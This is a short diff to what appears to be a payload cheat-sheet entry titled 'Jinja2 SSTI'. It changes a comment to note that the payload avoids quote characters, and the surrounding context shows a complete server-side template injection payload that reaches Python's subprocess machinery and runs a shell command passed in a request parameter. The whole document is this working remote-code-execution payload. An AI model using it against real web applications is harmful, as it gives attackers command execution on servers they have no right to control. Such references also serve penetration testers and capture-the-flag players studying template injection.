@@ -1,7 +1,7 @@
 # Jinja2 SSTI
 
 ```
-# ?cmd=id
+# ?cmd=id and no " and '
 {{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }} 
 
 
